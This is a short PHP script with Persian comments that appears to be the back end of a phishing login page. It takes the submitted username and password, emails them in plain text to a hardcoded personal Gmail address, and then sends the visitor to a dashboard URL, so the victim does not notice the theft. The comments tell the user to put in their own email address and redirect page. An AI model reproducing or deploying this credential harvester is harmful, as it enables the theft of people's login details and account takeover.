<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    $to = "alirezaaz33221140@gmail.com"; // ایمیل شما
    $subject = "ورود جدید به سایت";
    $message = "👤 نام کاربری: $username\n🔒 رمز عبور: $password";
    $headers = "From: no-reply@example.com";

    mail($to, $subject, $message, $headers);
}
header("Location: https://example.com/dashboard"); // اینو به هر صفحه‌ای که می‌خوای تغییر بدی
exit();
?>
